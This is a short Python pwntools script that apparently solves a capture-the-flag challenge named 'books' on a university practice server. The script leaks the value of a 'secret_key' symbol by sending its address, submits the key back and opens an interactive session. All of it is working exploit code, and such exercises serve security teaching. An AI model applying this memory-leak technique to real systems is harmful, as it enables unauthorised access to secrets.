from pwn import *

context.log_level = "INFO"
context.terminal = ["tmux", "splitw", "-f", "-h"]
target_file = "./books"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b questions
    continue
    ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1285)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
target_addr = e.symbols.secret_key
print(f'Target address: {hex(target_addr)}')
p.recvuntil(b"> ")
p.send(p64(target_addr))
secret_key = int(p.recvuntil(b"\n").strip(), 16)
print(f'Secret key: {secret_key}')
p.recvuntil(b"> ")
p.sendline(p64(secret_key))
p.interactive()
